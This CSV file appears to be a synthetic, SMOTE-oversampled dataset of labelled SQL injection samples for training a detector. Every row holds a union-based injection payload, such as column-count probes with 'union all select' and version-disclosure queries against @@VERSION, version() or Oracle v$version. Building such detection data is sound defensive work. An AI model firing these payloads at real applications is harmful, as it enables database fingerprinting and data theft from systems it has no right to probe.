id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
SMOTE_000177,attack,union,"1' in boolean mode  )   union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000161,0.26377872423267884
SMOTE_000178,attack,union," select * from users where id  =  1 +  (  1  )   union select null,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000006,0.30103056582506227
SMOTE_000179,attack,union,"-1447"" union all select 3013,3013,3013,3013,3013,3013,3013--",nearest_attack_euclidean,R000240,0.2155809629465391
SMOTE_000180,attack,union,"-3924'||  (  select 'ssld' from dual where 6229  =  6229 union all select 6229,6229,6229,6229,6229#",nearest_attack_euclidean,R000293,0.029515230161101136
SMOTE_000181,attack,union,"-8893%'  )   union all select 1254,1254--",nearest_attack_euclidean,R000126,0.08062697359419622
SMOTE_000182,attack,union," select * from users where id  =  1 or 1#""? union select version  (    )  ,version  (    )   -- 1",nearest_attack_euclidean,R000022,0.4266567447739267
SMOTE_000183,attack,union,"-2316%' union all select 8636,8636,8636,8636,8636,8636,8636--",nearest_attack_euclidean,R000255,0.0656623249652069
SMOTE_000184,attack,union,"-7945%'   )    )     )   union all select 4286,4286,4286,4286,4286,4286--",nearest_attack_euclidean,R000119,0.40250169992859824
SMOTE_000185,attack,union,"-2085""  )   as hkev where 7730  =  7730 union all select 7730,7730--",nearest_attack_euclidean,R000121,0.741033464393561
SMOTE_000186,attack,union,"-3667%'   )    )    union all select 3560,3560,3560--",nearest_attack_euclidean,R000222,0.30451371860476806
SMOTE_000187,attack,union," select * from users where id  =  1 + \+*$ union select null,@@VERSION -- 1",nearest_attack_euclidean,R000045,0.6327872335383337
SMOTE_000188,attack,union," select * from users where id  =  '1' or $<\ union select 1,@@VERSION -- 1'",nearest_attack_euclidean,R000057,0.006193941766083178
SMOTE_000189,attack,union,"-3017""   )    )    as ljit where 9128  =  9128 union all select 9128,9128,9128,9128,9128--",nearest_attack_euclidean,R000221,0.25378721469964494
SMOTE_000190,attack,union," select * from users where id  =  1 or 1#""  (   union select version  (    )  ,version  (    )   -- 1",nearest_attack_euclidean,R000051,0.12070278412258569
SMOTE_000191,attack,union,"-3104"" union all select 5717,5717,5717,5717,5717,5717,5717,5717,5717--",nearest_attack_euclidean,R000099,0.14424477791927282
SMOTE_000192,attack,union,"-7611  )   as tuje where 6101  =  6101 union all select 6101,6101,6101,6101,6101,6101,6101,6101--",nearest_attack_euclidean,R000140,0.027585989485763195
SMOTE_000193,attack,union,"-9758'+  (  select 'rlcy' where 3691  =  3691 union all select 3691,3691,3691,3691,3691,3691,3691--",nearest_attack_euclidean,R000279,0.7974895878474918
SMOTE_000194,attack,union,"-3300' union all select 8979,8979,8979,8979,8979,8979--",nearest_attack_euclidean,R000259,0.14838778964548868
SMOTE_000195,attack,union,"-2333' union all select 9714,9714,9714--",nearest_attack_euclidean,R000162,0.33574137088260436
SMOTE_000196,attack,union,-6912' in boolean mode  )   union all select 6012--,nearest_attack_euclidean,R000284,0.44805899800993065
SMOTE_000197,attack,union,"-3361'||  (  select 'msfi' where 4806  =  4806 union all select 4806,4806,4806,4806,4806,4806,4806,4806,4806--",nearest_attack_euclidean,R000213,0.07371648663237715
SMOTE_000198,attack,union," select * from users where id  =  1 or 1#""; union select 'a',version  (    )   -- 1",nearest_attack_euclidean,R000053,6.893535585037461
SMOTE_000199,attack,union,"-7637"" union all select 8498,8498,8498--",nearest_attack_euclidean,R000249,0.0726032290948755
SMOTE_000200,attack,union,"-6125'||  (  select 'hwnm' where 1428  =  1428 union all select 1428,1428,1428,1428,1428,1428#",nearest_attack_euclidean,R000218,0.3363167288076246
